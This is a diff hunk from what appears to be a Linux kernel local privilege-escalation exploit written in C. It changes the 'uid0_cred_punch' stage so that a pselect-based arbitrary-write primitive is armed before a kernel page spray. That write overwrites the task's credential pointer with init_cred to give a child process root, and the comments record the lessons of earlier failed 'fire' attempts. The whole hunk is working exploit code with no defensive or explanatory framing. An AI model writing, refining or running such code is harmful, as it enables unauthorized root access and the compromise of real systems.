@@ -2565,25 +2565,39 @@ uid0_cred_punch:;
          * store-2: *slot = init_cred; store-1 only corrupts
          * init_cred.usage (huge refcount — never freed). Child then
          * reads getuid()==0 directly (no setuid dependency).
+         *
+         * ORDER (09-14 fire fl004908 lesson): UID0_DIRECT auto-runs a
+         * WRITE_PROOF phase that leaves pselect_custom_write==4 +
+         * MODE4_WRITE_PROOF/MODE4_ARISTOTLE set when DIRECT bypasses
+         * it mid-spray. Mode 2 must be armed BEFORE the spray — the
+         * first fire sprayed a mode-4 page (W0.pi inert 1,0,0,
+         * owner=1) and only then switched modes. Clear the stale
+         * envs, arm mode 2, THEN spray unconditionally (a stale
+         * page_base from the aborted phase is mode-4 geometry).
          */
+        unsetenv("MODE4_WRITE_PROOF");
+        unsetenv("MODE4_ARISTOTLE");
+        unsetenv("MODE4_DATAONLY");
+        unsetenv("MODE4_SLIDE");
+        unsetenv("MODE4_SLIDE_ZERO");
+        unsetenv("MODE4_ROOT_SPRAY");
+        unsetenv("MODE4_PAD3");
         setenv("MODE4_JC2", "1", 1);
         g_cred_copy = 0; /* value = REAL init_cred, not the copy */
-        if (!page_base || !fake_w0 || !fake_lock) {
-          page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-          pr_info("JC2 spray: base=%016zx lock=%016zx\n",
-                  page_base, fake_lock);
-          if (!page_base) {
-            pr_error("JC2 spray failed\n");
-            live_sync_log("UID0", "jc2_spray_fail");
-          }
+        pselect_child_node = 1;
+        set_pselect_write_mode(use_task + TASK_CRED_OFF, 0, 2);
+        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+        pr_info("JC2 spray: base=%016zx lock=%016zx w0=%016zx\n",
+                page_base, fake_lock, fake_w0);
+        if (!page_base) {
+          pr_error("JC2 spray failed\n");
+          live_sync_log("UID0", "jc2_spray_fail");
         }
         pr_info("UID0 JC2 punch: W0.pi pc=%016zx right=init_cred "
                 "-> *(task+0x780); ghost benign, prio=0, pi_waiters=0\n",
                 (size_t)(use_task + TASK_CRED_OFF - 8));
         live_sync_log("UID0", "jc2_punch");
         durable_stage("uid0_jc2_punch");
-        pselect_child_node = 1;
-        set_pselect_write_mode(use_task + TASK_CRED_OFF, 0, 2);
         run_main_route_threads();
         clear_pselect_write();
         unsetenv("MODE4_JC2");
